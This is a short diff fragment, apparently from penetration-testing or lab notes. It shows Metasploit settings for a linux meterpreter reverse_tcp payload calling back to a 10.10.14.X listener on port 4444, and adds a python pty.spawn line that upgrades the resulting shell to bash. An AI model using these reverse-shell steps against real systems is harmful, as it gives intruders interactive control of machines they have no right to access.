@@ -95,3 +95,7 @@ set LHOST 10.10.14.X
 set LPORT 4444
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 run
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
